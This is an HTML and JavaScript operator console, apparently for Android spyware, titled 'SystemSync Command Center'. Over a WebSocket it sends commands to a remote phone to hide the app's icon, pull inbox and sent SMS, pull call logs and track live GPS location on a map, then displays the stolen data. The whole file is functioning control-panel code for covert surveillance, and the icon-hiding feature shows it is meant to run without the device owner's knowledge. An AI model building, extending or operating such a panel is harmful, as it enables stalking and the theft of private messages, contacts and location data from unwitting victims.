<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>SystemSync Ultra Console</title>

<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

<style>

/* ===== GLOBAL ===== */

body{
    margin:0;
    background:linear-gradient(135deg,#050505,#0c0c0c);
    color:#e0e0e0;
    font-family:'Segoe UI',sans-serif;
    display:flex;
    flex-direction:column;
    height:100vh;
    overflow:hidden;
}

/* ===== HEADER ===== */

.header{
    height:60px;
    background:#000;
    border-bottom:1px solid #111;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 25px;
}

.title{
    font-size:20px;
    color:#00d2ff;
    font-weight:600;
}

.status-badge{
    padding:6px 14px;
    border-radius:20px;
    font-weight:bold;
}

.online{background:#063b13;color:#69f0ae;}
.offline{background:#3b0606;color:#ff8a80;}

.net-info{
    font-family:monospace;
    color:#64b5f6;
}

/* ===== MAIN LAYOUT ===== */

.main{
    flex:1;
    display:flex;
}

/* ===== CONTROL PANEL ===== */

.panel{
    width:320px;
    background:#0d0d0d;
    border-right:1px solid #111;
    padding:25px;
    overflow-y:auto;
}

.section{
    margin-bottom:28px;
}

.section h3{
    margin:0 0 10px 0;
    font-size:14px;
    color:#90caf9;
    letter-spacing:1px;
}

button{
    width:100%;
    padding:12px;
    margin-bottom:8px;
    border:none;
    border-radius:8px;
    cursor:pointer;
    background:#151515;
    color:white;
    transition:.25s;
    font-size:14px;
}

button:hover{
    background:#1f1f1f;
    transform:translateY(-1px);
}

/* TOGGLE BUTTON */

.toggle{
    background:linear-gradient(135deg,#00d2ff,#3a7bd5);
    color:black;
    font-weight:600;
}

/* ===== MOBILE FRAME ===== */

.viewer{
    flex:1;
    display:flex;
    align-items:center;
    justify-content:center;
}

.phone{
    width:380px;
    height:720px;
    border-radius:38px;
    background:#000;
    box-shadow:
        0 0 60px rgba(0,210,255,.08),
        inset 0 0 15px rgba(255,255,255,.05);
    border:10px solid #111;
    display:flex;
    flex-direction:column;
    overflow:hidden;
}

.phone-header{
    padding:14px;
    background:#070707;
    border-bottom:1px solid #111;
    text-align:center;
    font-weight:600;
}

.phone-content{
    flex:1;
    overflow:auto;
    padding:12px;
}

/* DATA CARDS */

.data-card{
    background:#111;
    padding:10px;
    margin-bottom:10px;
    border-radius:6px;
    border-left:3px solid #00d2ff;
}

.label{
    color:#777;
    font-size:12px;
}

/* MAP */

#map{
    height:100%;
    width:100%;
}

.gps-info{
    position:absolute;
    top:0;
    left:0;
    width:100%;
    padding:10px;
    background:rgba(0,0,0,.75);
    font-size:12px;
}

</style>
</head>

<body>

<div class="header">
    <div class="title">SystemSync Command Center</div>

    <div class="status-badge offline" id="connectionStatus">
        DEVICE OFFLINE
    </div>

    <div class="net-info" id="networkInfo">
        WAITING FOR NETWORKâ€¦
    </div>
</div>

<div class="main">

    <!-- LEFT PANEL -->
    <div class="panel">

        <div class="section">
            <h3>APP CONTROL</h3>

            <!-- ðŸ”¥ TOGGLE BUTTON -->
            <button id="toggleAppBtn"
                    class="toggle"
                    onclick="toggleApp()">
                Hide App Icon
            </button>
        </div>

        <div class="section">
            <h3>COMMUNICATION</h3>

            <button onclick="sendCommand('getSMS inbox')">
                Inbox SMS
            </button>

            <button onclick="sendCommand('getSMS sent')">
                Sent SMS
            </button>

            <button onclick="sendCommand('getCallLogs')">
                Call Logs
            </button>
        </div>

        <div class="section">
            <h3>TRACKING</h3>

            <button onclick="sendCommand('getLocation')">
                Live GPS Location
            </button>
        </div>

    </div>

    <!-- RIGHT MOBILE VIEW -->
    <div class="viewer">

        <div class="phone">

            <div class="phone-header"
                 id="outputHeader">
                Output View
            </div>

            <div class="phone-content"
                 id="outputContent">

                <div style="text-align:center;color:#555;margin-top:50%;">
                    Awaiting commandâ€¦
                </div>

            </div>
        </div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>

const ws = new WebSocket("wss://" + window.location.host);

let mapInstance=null;
let appHidden=false;

/* =========================
   TOGGLE BUTTON
========================= */

function toggleApp(){

    appHidden=!appHidden;

    if(appHidden){
        sendCommand('hideApp');
        toggleAppBtn.innerText="Show App Icon";
    }
    else{
        sendCommand('showApp');
        toggleAppBtn.innerText="Hide App Icon";
    }
}

/* =========================
   SOCKET
========================= */

ws.onopen=()=>ws.send("I_AM_WEB");

ws.onmessage=(event)=>{

    const msg=event.data;

    if(msg.startsWith("STATUS:")){
        const status=msg.split(":")[1];
        const badge=document.getElementById('connectionStatus');

        badge.className=status==='ONLINE'
            ?'status-badge online'
            :'status-badge offline';

        badge.innerText="DEVICE "+status;
    }

    else if(msg.startsWith("NET_INFO:")){
        networkInfo.innerText=msg.split(":")[1];
    }

    else if(msg.startsWith("SMS_DATA:")){
        renderSMS(JSON.parse(msg.substring(9)));
    }

    else if(msg.startsWith("CALL_DATA:")){
        renderCalls(JSON.parse(msg.substring(10)));
    }

    else if(msg.startsWith("LOC_DATA:")){
        renderLocation(JSON.parse(msg.substring(9)));
    }
};

function sendCommand(cmd){
    ws.send(cmd);
    outputContent.innerHTML=
        '<div style="text-align:center;padding:20px;">Fetching Data...</div>';
}

/* =========================
   RENDERERS
========================= */

function renderSMS(data){

    outputHeader.innerText="SMS Messages";
    outputContent.innerHTML="";

    data.forEach(sms=>{

        const card=document.createElement('div');
        card.className="data-card";

        card.innerHTML=`
            <div><span class="label">TYPE:</span> <b>${sms.type}</b></div>
            <div><span class="label">FROM:</span> ${sms.number}</div>
            <div><span class="label">MSG:</span> ${sms.content}</div>
            <div><span class="label">TIME:</span> ${sms.date}</div>
        `;

        outputContent.appendChild(card);
    });
}

function renderCalls(data){

    outputHeader.innerText="Call Logs";
    outputContent.innerHTML="";

    data.forEach(call=>{

        const card=document.createElement('div');
        card.className="data-card";

        card.innerHTML=`
            <div><span class="label">TYPE:</span> <b>${call.type}</b></div>
            <div><span class="label">CONTACT:</span> ${call.number}</div>
            <div><span class="label">DURATION:</span> ${call.duration}</div>
            <div><span class="label">TIME:</span> ${call.date}</div>
        `;

        outputContent.appendChild(card);
    });
}

function renderLocation(data){

    outputHeader.innerText="GPS Tracking";
    outputContent.innerHTML="";

    if(data.error){
        outputContent.innerHTML=`<div style="color:red;text-align:center;">${data.error}</div>`;
        return;
    }

    const info=document.createElement('div');
    info.className='gps-info';

    info.innerHTML=`
        <div><b>LAT:</b> ${data.lat}</div>
        <div><b>LON:</b> ${data.lon}</div>
        <div><b>ACCURACY:</b> ${data.acc} meters</div>
    `;

    outputContent.appendChild(info);

    const mapDiv=document.createElement('div');
    mapDiv.id="map";
    outputContent.appendChild(mapDiv);

    setTimeout(()=>{

        if(mapInstance) mapInstance.remove();

        mapInstance=L.map('map')
            .setView([data.lat,data.lon],15);

        L.tileLayer(
            'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png'
        ).addTo(mapInstance);

        L.marker([data.lat,data.lon])
            .addTo(mapInstance);

        L.circle([data.lat,data.lon],{
            radius:data.acc,
            color:'blue',
            fillOpacity:.2
        }).addTo(mapInstance);

    },100);
}

</script>

</body>
</html>
